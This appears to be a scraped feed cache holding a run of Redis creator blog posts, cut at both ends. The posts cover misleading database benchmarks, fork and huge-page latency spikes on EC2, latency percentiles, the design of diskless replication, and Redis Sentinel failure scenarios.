<br>However there are people that beg to differ, and believe comparing different database systems for speed is a good idea anyway. For example, yesterday a benchmark of Redis and AerospikeDB was published here: http://lynnlangit.com/2015/01/28/lessons-learned-benchmarking-nosql-on-the-aws-cloud-aerospikedb-and-redis/.
<br>
<br>I’ll use this benchmark to show my point about how benchmarks are misleading beasts. In the benchmark huge EC2 instances are used, for some strange reason, since the instances are equipped with 244 GB of RAM (!). Those are R3.8xlarge instances. For my tests I’ll use a more real world m3.medium instance.
<br>
<br>Using such a beast of an instance Redis scored, in the single node case, able to provide 128k ops per second. My EC2 instance is much more limited, testing from another EC2 instance with Redis benchmark, not using pipelining, and with the same 100 bytes data size, I get 32k ops/sec, so my instance is something like 4 times slower, in the single process case.
<br>
<br>Let’s see with Redis INFO command how the system is using the CPU during this benchmark:
<br>
<br># CPU
<br>used_cpu_sys:181.78
<br>used_cpu_user:205.05
<br>used_cpu_sys_children:0.12
<br>used_cpu_user_children:0.87
<br>127.0.0.1:6379> info cpu
<br>
<br>… after 10 seconds of test …
<br>
<br># CPU
<br>used_cpu_sys:184.52
<br>used_cpu_user:206.42
<br>used_cpu_sys_children:0.12
<br>used_cpu_user_children:0.87
<br>
<br>Redis spent ~ 3 seconds of system time, and only ~ 1.5 seconds in user space. What happens here is that for each request the biggest part of the work is to perform the read() and write() call. Also since it’s one-query one-reply workload for each client, we pay a full RTT for each request of each client.
<br>
<br>Now let’s check what happens if I use pipelining instead, a feature very known and much exploited by Redis users, since it’s the only way to maximize the server usage, and there are usually a number of places in the application where you can perform multiple operations at a given time.
<br>
<br>With a pipeline of 32 operations the numbers changed drastically. My tiny instance was able to deliver 250k ops/sec using a single core, which is 25% of the *top* result using 32 (each faster) cores in the mentioned benchmark.
<br>
<br>Let’s look at the CPU time:
<br>
<br># CPU
<br>used_cpu_sys:189.16
<br>used_cpu_user:216.46
<br>used_cpu_sys_children:0.12
<br>used_cpu_user_children:0.87
<br>127.0.0.1:6379> info cpu
<br>
<br>… after 10 seconds of test …
<br>
<br># CPU
<br>used_cpu_sys:190.60
<br>used_cpu_user:224.92
<br>used_cpu_sys_children:0.12
<br>used_cpu_user_children:0.87
<br>
<br>This time we are actually using the database engine to serve queries with our CPU, we are not just losing much of the time context switching. We used ~1.5 seconds of system time, and 8.46 seconds into the Redis process itself.
<br>
<br>Using lower numbers in the pipeline gets us results in the middle. Pipeline of 4 = 100k ops/sec (that should translate to ~ 400k ops/sec in the bigger instance used in the benchmark), pipeline 8 = 180k ops/sec, and so forth.
<br>
<br>So basically it is not a coincidence that benchmarking Redis and AerospikeDB in this way we get remarkably similar results. More or less you are not testing the databases, but the network stack and the kernel. If the DB can serve queries using a read and a write system call without any other huge waste, this is what we get, and here the time to serve the actual query is small since we are talking about data fitting into memory (just a note, 10M keys of 100k in Redis will use a fraction of the memory that was allocated in those instances).
<br>
<br>However there is more about that. What about the operations we can perform? To test Redis doing GET/SET is like to test a Ferrari checking how good it is at cleaning the mirror when it rains.
<br>
<br>A fundamental part of the Redis architecture is that largely different operations have similar costs, so what about our huge Facebook game posting scores of the finished games to create the leaderboard?
<br>
<br>The same single process can do 110k ops/sec when the query is: ZADD myscores <random-int> <random-int>.
<br>
<br>But let’s demand more, what about estimating the cardinality with the HyperLogLog, at the same time adding new elements and reading the current guess with two redis-benchmark processes? Set size is 10 millions again. So during this test I spawned a benchmark executing PFADD with random elements of the set, and another doing PFCOUNT at the same time in the same HyperLogLog. Both scored simultaneously at 250k ops/sec, for a total of half a million ops per second with a single Redis process.
<br>
<br>In Redis doing complex operations is similar to pipelining. You want to do *more* for each read/write, otherwise your performance is dominated by I/O.
<br>
<br>Ok, so a few useful remarks. 1) GET/SET Benchmarks are not a great way to compare different database systems. 2) A better performance comparison is by use case. You say, for a given specific use case, using different data model, schema, queries, strategies, how much instances I need to handle the same traffic for the same app with two different database systems? 3) Test with instance types most people are going to actually use, huge instance types can mask inefficiencies of certain database systems, and is anyway not what most people are going to use.
<br>
<br>We’ll continue to optimize Redis for speed, and will continue to avoid posting comparative benchmarks.
<br>
<br>[Thanks to Amazon AWS for providing me free access to EC2]
<a href=\"http://antirez.com/news/85\">Comments</a>" nil "http://antirez.com/news/85" "a168c34de855aba4e8dfe00f6ddb4705") (37 (26588 31766 997063 268000) "http://antirez.com/news/84
" "Redis latency spikes and the Linux kernel: a few more details " nil "Mon, 03 Nov 2014 15:58:19 +0000" "Today I was testing Redis latency using m3.medium EC2 instances. I was able to replicate the usual latency spikes during BGSAVE, when the process forks, and the child starts saving the dataset on disk. However something was not as expected. The spike did not happened because of disk I/O, nor during the fork() call itself.
<br>
<br>The test was performed with a 1GB of data in memory, with 150k writes per second originating from a different EC2 instance, targeting 5 million keys (evenly distributed). The pipeline was set to 4 commands. This translates to the following command line of redis-benchmark:
<br>
<br>    ./redis-benchmark -P 4 -t set -r 5000000 -n 1000000000
<br>
<br>Every time BGSAVE was triggered, I could see ~300 milliseconds latency spikes of unknown origin, since fork was taking 6 milliseconds. Fortunately Redis has a software watchdog feature, that is able to produce a stack trace of the process during a latency event. It’s quite a simple trick but works great: we setup a SIGALRM to be delivered by the kernel. Each time the serverCron() function is called, the scheduled signal is cleared, so actually Redis never receives it if the control returns fast enough to the Redis process. If instead there is a blocking condition, the signal is delivered by the kernel, and the signal handler prints the stack trace.
<br>
<br>Instead of getting stack traces with the fork call, the process was always blocked near MOV* operations happening in the context of the parent process just after the fork. I started to develop the theory that Linux was “lazy forking” in some way, and the actual heavy stuff was happening later when memory was accessed and pages had to be copy-on-write-ed.
<br>
<br>Next step was to read the fork() implementation of the Linux kernel. What the system call does is indeed to copy all the mapped regions (vm_area_struct structures). However a traditional implementation would also duplicate the PTEs at this point, and this was traditionally performed by copy_page_range(). However something changed… as an optimization years ago: now Linux does not just performs lazy page copying, as most modern kernels. The PTEs are also copied in a lazy way on faults. Here is the top comment of copy_range_range():
<br>
<br>         * Don't copy ptes where a page fault will fill them correctly.
<br>         * Fork becomes much lighter when there are big shared or private
<br>         * readonly mappings. The tradeoff is that copy_page_range is more
<br>         * efficient than faulting.
<br>
<br>Basically as soon as the parent process performs an access in the shared regions with the child process, during the page fault Linux does the big amount of work skipped by fork, and this is why I could see always a MOV instruction in the stack trace.
<br>
<br>While this behavior is not good for Redis, since to copy all the PTEs in a single operation is more efficient, it is much better for the traditional use case of fork() on POSIX systems, which is, fork()+exec*() in order to spawn a new process.
<br>
<br>This issue is not EC2 specific, however virtualized instances are slower at copying PTEs, so the problem is less noticeable with physical servers.
<br>
<br>However this is definitely not the full story. While I was testing this stuff in my Linux box, I remembered that using the libc malloc, instead of jemalloc, in  certain conditions I was able to measure less latency spikes in the past. So I tried to check if there was some relation with that.
<br>
<br>Indeed compiling with MALLOC=libc I was not able to measure any latency in the physical server, while with jemalloc I could observe the same behavior observed with the EC2 instance. To understand better the difference I setup a test with 15 million keys and a larger pipeline in order to stress more the system and make more likely that page faults of all the mmaped regions could happen in a very small interval of time. Then I repeated the same test with jemalloc and libc malloc:
<br>
<br>bare metal, 675k/sec writes to 15 million keys, jemalloc: max spike 339 milliseconds.
<br>bare metal, 675k/sec writes to 15 million keys, malloc: max spike 21 milliseconds.
<br>
<br>I quickly tried to replicate the same result with EC2, same stuff, the spike was a fraction with malloc.
<br>
<br>The next logical thing after this findings is to inspect what is the difference in the memory layout of a Redis system running with libc malloc VS one running with jemalloc. The Linux proc filesystem is handy to investigate the process internals (in this case I used /proc/<pid>/smaps file).
<br>
<br>Jemalloc memory is allocated in this region:
<br>
<br>7f8002c00000-7f8062400000 rw-p 00000000 00:00 0
<br>Size:            1564672 kB
<br>Rss:             1564672 kB
<br>Pss:             1564672 kB
<br>Shared_Clean:          0 kB
<br>Shared_Dirty:          0 kB
<br>Private_Clean:         0 kB
<br>Private_Dirty:   1564672 kB
<br>Referenced:      1564672 kB
<br>Anonymous:       1564672 kB
<br>AnonHugePages:   1564672 kB
<br>Swap:                  0 kB
<br>KernelPageSize:        4 kB
<br>MMUPageSize:           4 kB
<br>Locked:                0 kB
<br>VmFlags: rd wr mr mw me ac sd
<br>
<br>While libc big region looks like this:
<br>
<br>0082f000-8141c000 rw-p 00000000 00:00 0                                  [heap]
<br>Size:            2109364 kB
<br>Rss:             2109276 kB
<br>Pss:             2109276 kB
<br>Shared_Clean:          0 kB
<br>Shared_Dirty:          0 kB
<br>Private_Clean:         0 kB
<br>Private_Dirty:   2109276 kB
<br>Referenced:      2109276 kB
<br>Anonymous:       2109276 kB
<br>AnonHugePages:         0 kB
<br>Swap:                  0 kB
<br>KernelPageSize:        4 kB
<br>MMUPageSize:           4 kB
<br>Locked:                0 kB
<br>VmFlags: rd wr mr mw me ac sd
<br>
<br>Looks like here there are a couple different things.
<br>
<br>1) There is [heap] in the first line only for libc malloc.
<br>2) AnonHugePages field is zero for libc malloc but is set to the size of the region in the case of jemalloc.
<br>
<br><this is wrong>
<br>Basically, the difference in latency appears to be due to the fact that malloc is using transparent huge pages, a kernel feature that allows to transparently glue multiple normal 4k pages into a few huge pages, which are 2048k each. This in turn means that copying the PTEs for this regions is much faster.
<br></this is wrong>
<br>
<br>EDIT: Unfortunately I just spotted that I'm totally wrong, the huge pages apparently are only used by jemalloc: I just mis-read the outputs since this seemed so obvious. So on the contrary, it appears that the high latency is due to the huge pages thing for some unknown reason. So actually it is malloc that, while NOT using huge pages, is going much faster. I've no idea about what is happening here, so please disregard the above conclusions.
<br>
<br><wrong advice, read later EDIT2>
<br>Meanwhile for low latency applications you may want to build Redis with “make MALLOC=libc”, however make sure to use “make distclean” before, and be aware that depending on the work load, libc malloc suffers fragmentation more than jemalloc.
<br></wrong>
<br>
<br>More news soon…
<br>
<br>EDIT2: Oh wait... since the problem is huge pages, this is MUCH better, since we can disable it. And I just verified that it works:
<br>
<br>echo never > /sys/kernel/mm/transparent_hugepage/enabled
<br>
<br>This is the new Redis mantra apparently.
<br>
<br>UPDATE: While this seemed unrealistic to me, I experimentally verified that the huge pages memory spike is due to the fact that with 50 clients writing at the same time, with N queued requests each, the Redis process can touch in the space of *a single event loop iteration* all the process pages, so its copy-on-writing the entire process address space. This means that not only huge pages are horrible for latency, but that are also horrible for memory usage.
<a href=\"http://antirez.com/news/84\">Comments</a>" nil "http://antirez.com/news/84" "c26f3dd6561ff66a4d9daf71a541df47") (36 (26588 31766 996592 976000) "http://antirez.com/news/83
" "Redis latency spikes and the 99th percentile " nil "Thu, 30 Oct 2014 13:28:42 +0000" "One interesting thing about the Stripe blog post about Redis is that they included latency graphs obtained during their tests. In order to persist on disk Redis requires to call the fork() system call. Usually forking using physical servers, and most hypervisors, is fast even with big processes. However Xen is slow to fork, so with certain EC2 instance types (and other virtual servers providers as well), it is possible to have serious latency spikes every time the parent process forks in order to persist on disk. The Stripe graph is pretty clear in this regard.
<br>
<br>img://antirez.com/misc/stripe-latency.png
<br>
<br>As you can guess, if you perform a latency test during the fork, all the requests crossing the moment the parent process forks will be delayed up to one second (taking as example the graph above, not sure about what was the process size nor the EC2 instance). This will produce a number of samples with high latency, and will affect the 99th percentile result.
<br>
<br>To change instance type, configuration, setup, or whatever in order to improve this behavior is a good idea, and there are use cases where even a single request having a too high latency is unacceptable. However apparently it is not obvious how latency spikes of 1 second every 30 minutes (or more, if you use AOF with the right rewrite triggers) is very different from latency spikes which are evenly distributed in the set of requests.
<br>
<br>With evenly distributed spikes, if the generation of a page needs to perform a number of requests to a Redis server in order to create the output, it is very likely that a page view will incur in the latency penalty: this impacts the quality of service in a great way potentially, check this link: http://latencytipoftheday.blogspot.it/2014/06/latencytipoftheday-most-page-loads.html.
<br>
<br>However 1 second of latency every 30 minutes run is a completely different thing. For once, the percentile with good latency gets better *as the number of requests increase*, since the more the requests are, the more this second of latency will be unlikely to get over-represented in the samples (if you have just 1 request per minute, and one of those requests happen to hit the high latency, it will affect the 99.99th percentile much more than what happens with 100 requests per second).
<br>
<br>Second: most page views will be unaffected. The only users that will see the 1 second delay are the ones that make a request crossing the fork call. All the other requests will experience an extremely low probability of hitting a request that has a latency which is significantly worse than the average latency. Also note that a page view crossing the fork time, even when composed of 100 requests, can’t be delayed for more than a second, since the requests are completed as soon as the fork() call terminates.
<br>
<br>The bottom line here is that, if there are hard latency requirements for each single request, it is clear that a setup where a request can be delayed 1 second from time to time is a big problem. However when the goal is to provide a good quality of service, the distribution of the latency spikes have a huge effect on the outcome. Redis latency spikes due to fork on Xen are isolated points in the line of time, so they affect a percentage of page views, even when the page views are composed of a big number of Redis requests, which is proportional to the latency spike total time percentage, which is, 1 second every 1800 seconds in this case, so only the 0.05% of the page views will be affected.
<br>
<br>Latency characteristics are hard to capture with a single metric: the full percentile curve and the distribution of the spikes, can provide a better picture. In general good rule of thumbs are a good way to start a research, and in general it is true that the average latency is a poor metric. However to promote a rule of thumb into an absolute truth has also its disadvantages, since many complex things remain complex, and in need for close inspection, regardless of our willingness to over simplify them.
<br>
<br>At the same time, fork delays in EC2 instances are one of the worst experiences for Redis users in one of the most popular runtime environments today, so I’m starting to test Redis with EC2 regularly now: we’ll soon have EC2 specific optimization pages on the Redis official documentation, and a way to operate master-slaves replicas with persistence disabled in a safer way.
<br>
<br>If you need EC2 + Redis master with persistence disabled now, the simplest to deploy “quick fix” is to disable automatic restarts of Redis instances, and use Sentinel for failover, so that crashed masters will not automatically return available, and will be failed over by Sentinel. The system administrator can restart the master manually after checking that the failover was successful and there is a new active master.
<br>
<br>EDIT: Make sure to check the Hacker News thread that contains interesting information about EC2, Xen and fork time: https://news.ycombinator.com/item?id=8532851. Also not all the EC2 instances are the same, and certain types provide great fork time on pair with bare metal systems: https://redislabs.com/blog/testing-fork-time-on-awsxen-infrastructure#.VFJQ-JPF8yF
<a href=\"http://antirez.com/news/83\">Comments</a>" nil "http://antirez.com/news/83" "9f22d6a2fab2ed57b899d71094daf202") (35 (26588 31766 991027 159000) "http://antirez.com/news/82
" "This is why I =?utf-8?Q?can=E2=80=99t?= have conversations using Twitter " nil "Wed, 29 Oct 2014 09:17:04 +0000" "Yesterday Stripe engineers wrote a detailed report of why they had an issue with Redis. This is very appreciated. In the Hacker News thread I explained that because now we have diskless replication (http://antirez.com/news/81) now persistence is no longer mandatory for people having a master-slaves replicas set. This changes the design constraints: now that we can have diskless replicas synchronization, it is worth it to better support the Stripe (ex?) use case of replicas set with persistence turned down, in a more safe way. This is a work in progress effort.
<br>
<br>In the same post Stripe engineers said that they are going to switch to PostgreSQL for the use case where they have issues with Redis, which is a great database indeed, and many times if you can go with the SQL data model and an on-disk database, it is better to use that instead of Redis which is designed for when you really want to scale to a lot of complex operations per second. Stripe engineers also said that they measured the 99th percentile and it was better with PostgreSQL compared to Redis, so in a tweet @aphyr wrote:
<br>
<br>“Note that *synchronous* Postgres replication *between AZs* delivers lower 99th latencies than asynchronous Redis”
<br>
<br>And I replied:
<br>
<br>“It could be useful to look at average latency to better understand what is going on, since I believe the 99% percentile is very affected by the latency spikes that Redis can have running on EC2.”
<br>
<br>Which means, if you have also the average, you can tell if the 99th percentile is ruined (or not) by latency spikes, that many times can be solved. Usually it is as simple as that: if you have a very low average, but the 99th percentile is bad, likely it is not that Redis is running slow because, for example, operations performed are very time consuming or blocking, but instead a subset of queries are served slow because of the usual issues in EC2: fork time in certain instances, remote disks I/O, and so forth. Stuff that you can likely address, since for example, there are instance types without the fork latency issue.
<br>
<br>For half the Twitter IT community, my statement was to promote the average latency as the right metric over 99th percentiles:
<br>
<br>\"averages are the worst possible metric for latency. No latency I've ever seen falls on a bell curve. Averages give nonsense.\"
<br>
<br>\"You have clearly not understood how the math works or why tail latencies matter in dist sys. I think we're done here.\"
<br>
<br>“indeed; the problem is that averages are not robust in the presence of outliers”
<br>
<br>Ehm, who said that average is a good metric? I proposed it to *detect* if there are or not big outliers. So during what was supposed to be a normal exchange, I find after 10 minutes my Twitter completely full of people that tell me that I’m an idiot to endorse averages as The New Metric For Latency in the world. Once you get the first retweets, you got more and more. Even a notable builder of other NoSQL database finds the time to lecture me a few things via Twitter: I reply saying that clearly what I wrote was that if you have 99th + avg you have a better picture of the curve and can understand if the problem is the Redis spikes on EC2, but magically the original tweet gets removed, so my tweets are now more out of context. My three tweets:
<br>
<br>1. “may point was, even if in the internet noise I'm not sure if it is still useful, that avg helps to understand why (…)”
<br>2. “the 99% percentile is bad. If avg is very good but 99% percentile is bad, you can suspect a few very bad samples”
<br>3. “this is useful with Redis, since with proper config sometimes you can improve the bad latency samples a lot.”
<br>
<br>Guess what? There is even somebody that isolated tweet #2 that was the continuation of “to understand why the 99% percentile is bad” (bad as in, is not providing good figures), and just read it out of context: “the 99% percentile is bad”.
<br>
<br>Once upon a time, people used to argue for days on usenet, but at least there was, most of the times, an argument against a new argument and so forth, with enough text and context to have a normal condition. This instead is just amplification of hate and engineering rules 101 together. 99th latency is the right metric and average is a poor one? Make sure to don’t talk about averages even in a context where it makes sense otherwise you get 10000 shitty replies.
<br>
<br>What to do with that? Now a good thing about me is that I’m not much affected by all this personally, but it is also clear that because I use Twitter for a matter of work, in order to inform people of what is happening with Redis, this is not a viable working environment. For example, latency: I care a lot about latency, so many efforts were done during the years in order to improve it (including diskless replication). We have monitoring as well in order to understand if and why there are latency spikes, Redis can provide you an human readable report of what is happening inside of it by monitoring different execution paths. After all this work, what you get instead is the wrong message retweeted one million times, which does not help. Most people will not follow the tweets to make an idea themselves, the reality is, at this point, rewritten: I said that average percentile is good and I don’t realize that you should look at the long tail. Next time I’ll talk about latency, for many people, I’ll be the one that has a few non clear ideas about it, so who knows what I’m talking about or what I’m doing?
<br>
<br>At the same time Twitter is RSS for humans, it is extremely useful to keep many people updated about what I love to do, which is, to work to my open source project that so far I tried to develop with care. So I’m trying to think about what a viable setup can be. Maybe I can just blog more, and use the Redis mailing list more, and use Twitter just to link stuff so that interested people can read, and interested people can argue and have real and useful discussions.
<br>
<br>I’ve a lot of things to do about Redis, for the users that have a good time with it, and a lot of things to do for the users that are experiencing problems. I feel like my time is best spent hacking instead of having non-conversations on Twitter. I love to argue, but this is just a futile exercise.
<a href=\"http://antirez.com/news/82\">Comments</a>" nil "http://antirez.com/news/82" "af9a02362db791576dfc3af9befe1dbb") (34 (26588 31766 990666 891000) "http://antirez.com/news/81
" "Diskless replication: a few design notes. " nil "Mon, 27 Oct 2014 16:34:15 +0000" "Almost a month ago a number of people interested in Redis development met in London for the first Redis developers meeting. We identified together a number of features that are urgent (and are now listed in a Github issue here: https://github.com/antirez/redis/issues/2045), and among the identified issues, there was one that was mentioned multiple times in the course of the day: diskless replication.
<br>
<br>The feature is not exactly a new idea, it was proposed several times, especially by EC2 users that know that sometimes it is not trivial for a master to provide good performances during slaves synchronization. However there are a number of use cases where you don’t want to touch disks, even running on physical servers, and especially when Redis is used as a cache. Redis replication was, in short, forcing users to use disk even when they don’t need or want disk durability.
<br>
<br>When I returned back home I wanted to provide a quick feedback to the developers that attended the meeting, so the first thing I did was to focus on implementing the feature that seemed the most important and non-trivial among the list of identified issues. In the next weeks the attention will be moved to the Redis development process as well: the way issues are handled, how new ideas can be proposed to the Redis project, and so forth. Sorry for the delay about these other important things, for now what you can get is, some code at least ;-)
<br>
<br>Diskless replication provided a few design challenges. It looks trivial but it is not, so since I want to blog more, I thought about documenting how the internals of this feature work. I’m sure that a blog post may make the understanding and adoption of the new feature simpler.
<br>
<br>How replication used to work
<br>===
<br>
<br>Newer versions of Redis are able, when the connection with the master is lost, to reconnect with the master, and continue the replication process in an incremental way just fetching the differences accumulated so far. However when a slave is disconnected for a long time, or restarted, or it is a new slave, Redis requires it to perform what is called a “full resynchronization”.
<br>
<br>It is a trivial concept, and means: in order to setup this slave, let’s transfer *all* the master data set to the slave. It will flush away its old data, and reload the new data from scratch, making sure it is running an exact copy of master’s data. Once the slave is an exact copy of the master, successive changes are streamed as a normal Redis commands, in an incremental way, as the master data set itself gets modified because of write commands sent by clients.
<br>
<br>The problem was the way this initial “bulk transfer” needed for a full resynchronization was performed. Basically a child process was created by the master, in order to generate an RDB file. When the child was done with the RDB file generation, the file was sent to slaves, using non blocking I/O from the parent process. Finally when the transfer was complete, slaves could reload the RDB file and go online, receiving the incremental stream of new writes.
<br>
<br>However this means that from the master point of view, in order to perform a full sync, we need:
<br>
<br>1) To write the RDB on disk.
<br>2) To load back the RDB from disk in order to send it to slaves.
<br>
<br>“2” is not great but “1” is much worse. If AOF is active at the same time, for example, the AOF fsync() can be delayed a lot by the child writing to the disk as fast as possible. With the wrong setup, especially with non-local disks, but sometimes even because of a non perfect kernel parameters tuning, the disk pressure was cause of latency spikes that are hard to deal with. Partial resynchronizations introduced with Redis 2.8 mitigated this problem a bit, but from time to time you have to restart your slaves, or they go offline for too much time, so it is impossible to avoid full resynchronizations.
<br>
<br>At the same time, this process had a few advantages. The RDB saving code was reused for replication as well, making the replication code simpler. Moreover while the child was producing the RDB file, new slaves could attach, and put in a queue: when the RDB was ready, we could feed multiple slaves at the same time.
<br>
<br>All in all in many setups it works great and allows to synchronize a number of slaves at the same time. Also many users run with RDB persistence enabled in the master side, but not AOF, so anyway to persist on disk was happening from time to time. Most bare-metal users don’t have any latency at all while Redis is persisting, moreover disks, especially local disks, have easy to predict performances: once the child starts to save, you don’t really need to check for timeouts or if it is taking too much time, it will end eventually, and usually within a reasonable amount time.
<br>
<br>For this reasons, disk-backed replication is *still* the default replication strategy, and there are no plans to remove it so far, but now we have an alternative in order to serve the use cases where it was not great.
<br>
<br>So what is diskless replication? It is the idea that you can write directly from the child process to the slaves, via socket, without any intermediate step.
<br>
<br>Sockets are not disks
<br>===
<br>
<br>The obvious problem about diskless replication is that writing to disks is different than writing to sockets. To start
<br>the API is different, since the RDB code used to write to C FILE pointers, while to write to sockets is a matter of writing to file descriptors. Moreover disk writes don’t fail if not for hard I/O errors (for example if the disk is full), so when a write fails, you can consider the process aborted. For sockets it is different since writes can be delayed since the receiver is slow and the local kernel buffer is full. Another interesting issue is that there is to deal with timeouts: what about the receiving side to experience a failure so that it stops reading from us? Or just the TCP connection is dead but we don’t get resets, and so forth. We can’t take the child sending the RDB file to slaves active forever, there must be a way to detect timeouts.
<br>
<br>Fortunately modifying the RDB code to write to file descriptors was trivial, because for an entirely different problem (MIGRATE/RESTORE for Redis Cluster) the code was already using an abstraction called “rio” (redis I/O), that abstracts the serialization and deserialization of Redis values in RDB format, so you can write a value to the disk,
<br>or to an in memory buffer. What I did was to support a new “rio” target, called fdset: a set of file descriptors.
<br>This is because as I’ll write later, we need to write to multiple file descriptors at the same time.
<br>
<br>However this was not enough. One of the main design tradeoffs was to understand if the in memory RDB transfer would happen in one of the following two ways:
<br>
<br>1) Way #1: produce a full RDB file in memory inside a buffer, than transfer it.
<br>2) Way #2: directly write to slaves sockets, incrementally, as the RDB was created.
<br>
<br>Way #1 is a lot simpler since it is basically like the on-disk writing stuff, but in a kind of RAM disk. However the obvious risk is using too much memory. Way #2 is a bit more risky, because you have to transfer while the child producing the RDB file is active. However the essence of the feature was to target environments with slow disks perhaps, but *with fast networks*, without requiring too much additional memory, otherwise the feature risks to be useless. So Way #2 was selected.
<br>
<br>However if you stream an RDB file like this, there is a new problem to solve… how will the slave understand that EOF is reached? We don’t know, when we start the transfer, how big the transfer will be. With on-disk replication instead the size was known, so the transfer happened using just a Redis protocol “bulk” string, with prefixed length. Something like:
<br>
<br>$92384923423\\r\\n
<br>… data follows …
<br>
<br>I was too lazy to implement some complex chunked protocol to announce incremental blocks sizes, so went for a more brute force approach. The master generates an unguessable and unlikely to collide 160 bits random string, and sends something like that to the slave:
<br>
<br>$EOF:796f255829a040e80168f94c9fe7eda16b35e5df\\r\\n
<br>… data follows …
<br>796f255829a040e80168f94c9fe7eda16b35e5df
<br>
<br>So basically this string, which is guaranteed (just because of infinitesimal probability) to never collide with anything inside the file, is used as the end of file mark. Trivial but works very well, and is simple.
<br>
<br>For timeouts, since it is a blocking write process (since we are in the context of the saving child process), I just used the SO_SNDTIMEO socket option. This way we are sure that we need to make progresses, otherwise the replication process is aborted. So for now there is no way to have an hard time limit for the child lifespan, and there are in theory pathological conditions where the slave would accept just one byte every timeout-1 seconds, to create a very slow transfer setup. Probably in the future the child will monitor the transfer rate, and if it drops under a reasonable figure, will exit with an error.
<br>
<br>Serving multiple slaves at the same time
<br>===
<br>
<br>Another goal of this implementation was to be able to serve multiple slaves at the same time. At first this looks impossible since once the RDB transfer starts, new slaves can’t attach, but need to wait for the current child to stop and a new one to start.
<br>
<br>However there is a very simple trick that covers a lot of use cases, which is, once the first slave want to replicate, we wait a few seconds for others to arrive as well. This covers the obvious case of a mass resync from multiple slaves for example.
<br>
<br>Because of this, the I/O code was designed in order to write to multiple file descriptors at the same time. Moreover
<br>in order to parallelize the transfer even if blocking I/O is used, the code tries to write a small amount of data to each fd in a loop, so that the kernel will send the packets in the background to multiple slaves at the same time.
<br>
<br>Probably the code itself is pretty easy to understand:
<br>
<br>    while(len) {
<br>        size_t count = len < 1024 ? len : 1024;
<br>        int broken = 0;
<br>        for (j = 0; j < r->io.fdset.numfds; j++) {
<br>            … error checking removed …
<br>
<br>            /* Make sure to write 'count' bytes to the socket regardless
<br>             * of short writes. */
<br>            size_t nwritten = 0;
<br>            while(nwritten != count) {
<br>                retval = write(r->io.fdset.fds[j],p+nwritten,count-nwritten);
<br>                if (retval <= 0) {
<br>                     … error checkign removed …
<br>                }
<br>                nwritten += retval;
<br>            }
<br>        }
<br>        p += count;
<br>        len -= count;
<br>        r->io.fdset.pos += count;
<br>        … more error checking removed …
<br>    }
<br>
<br>Note that writes are bufferized by the rio.c write target, since we want to write only when a given amount of data is available, otherwise we risk to send TCP packets with 5 bytes of data inside.
<br>
<br>Handling partial failures
<br>===
<br>
<br>Handling multiple slaves is not just writing to multiple FDs, which is quite simple. A big part of the story is actually to handle a few slaves failing without requiring to block the process for all the other slaves.
<br>File descriptors in error are marked with the related error code, and no attempt is made to write to them again.
<br>Also the code detects if all the FDs are in error, and abort the process at all.
<br>
<br>However when the RDB writing is terminated, the child needs to report what are the slaves that received the RDB and can continue the replication process. For this task, a unix pipe is used between the processes. The child returns an array of slave IDs and associated error state, so that the parent can do a decent job at logging errors as well.
<br>
<br>How this changes Redis is a more deep way I thought
<br>===
<br>
<br>Diskless replication finally allows for a totally disk-free experience in Redis master-slaves sets.
<br>This means we need to support this use case better. Currently replication is dangerous to run with persistence disabled, since I thought there was not a case for turning off persistence when anyway replication was going to trigger it. But now this changed… and as a result, there are already plans to support better replication in a non-disk backed environment. The same will be applied to Redis Cluster as well… which is also a good candidate for diskless operations, especially for caching use cases, where replicas can do a good job to provide data redundancy, but where it may not be too critical if crash-restart of multiple instances cause data loss of a subset of hash slots in the cluster.
<br>
<br>ETA
<br>===
<br>
<br>The code is already available in beta here: https://github.com/antirez/redis/commits/memsync
<br>It will be merged into unstable in the next days, but the plan is to wait a bit for feedbacks and bug reports, and later merge into 3.0 and 2.8 as well. The feature is very useful and it has little interactions with the rest of the Redis core when it is turned off. The plan is to just back port it everywhere and release it as “experimental” for some time.
<a href=\"http://antirez.com/news/81\">Comments</a>" nil "http://antirez.com/news/81" "5a208b28f8353136d161c2e91d1e9763") (33 (26588 31766 990001 372000) "http://antirez.com/news/80
" "A few arguments about Redis Sentinel properties and fail scenarios. " nil "Tue, 21 Oct 2014 15:18:10 +0000" "Yesterday distributed systems expert Aphyr, posted a tweet about a Redis Sentinel issue experienced by an unknown company (that wishes to remain anonymous):
<br>
<br>“OH on Redis Sentinel \"They kill -9'd the master, which caused a split brain...\"
<br>“then the old master popped up with no data and replicated the lack of data to all the other nodes. Literally had to restore from backups.\"
<br>
<br>OMG we have some nasty bug I thought. However I tried to get more information from Kyle, and he replied that the users actually disabled disk persistence at all from the master process. Yep: the master was configured on purpose to restart with a wiped data set.
<br>
<br>Guess what? A Twitter drama immediately started. People were deeply worried for Redis users. Poor Redis users! Always in danger.
<br>
<br>However while to be very worried is a trait of sure wisdom, I want to take the other path: providing some more information. Moreover this blog post is interesting to write since actually Kyle, while reporting the problem with little context, a few tweets later was able to, IMHO, isolate what is the true aspect that I believe could be improved in Redis Sentinel, which is not related to the described incident, and is in my TODO list for a long time now.
<br>
<br>But before, let’s check a bit more closely the behavior of Redis / Sentinel about the drama-incident.
<br>
<br>Welcome to the crash recovery system model
<br>===
<br>
<br>Most real world distributed systems must be designed to be resilient to the fact that processes can restart at random. Note that this is very different from the problem of being partitioned away, which is, the inability to exchange messages with other processes. It is, instead, a matter of losing state.
<br>
<br>To be more accurate about this problem, we could say that if a distributed algorithm is designed so that a process must guarantee to preserve the state after a restart, and fails to do this, it is technically experiencing a bizantine failure: the state is corrupted, and the process is no longer reliable.
<br>
<br>Now in a distributed system composed of Redis instances, and Redis Sentinel instances, it is fundamental that rebooted instances are able to restart with the old data set. Starting with a wiped data set is a byzantine failure, and Redis Sentinel is not able to recover from this problem.
<br>
<br>But let’s do a step backward. Actually Redis Sentinel may not be directly involved in an incident like that. The typical example is what happens if a misconfigured master restarts fast enough so that no failure is detected at all by Sentinels.
<br>
<br>1. Node A is the master.
<br>2. Node A is restarted, with persistence disabled.
<br>3. Sentinels (may) see that Node A is not reachable… but not enough to reach the configured timeout.
<br>4. Node A is available again, except it restarted with a totally empty data set.
<br>5. All the slave nodes B, C, D, ... will happily synchronize an empty data set form it.
<br>
<br>Everything wiped from the master, as per configuration, after all. And everything wiped from the slaves, that are replicating from what is believed to be the current source of truth for the data set.
<br>
<br>Let’s remove Sentinel from the equation, which is, point “3” of the above time line, since Sentinel did not acted at all in the example scenario.
<br>
<br>This is what you get. You have a Redis master replicating with N slaves. The master is restarted, configured to start with a fresh (empty) data set. Salves replicate again from it (an empty data set).
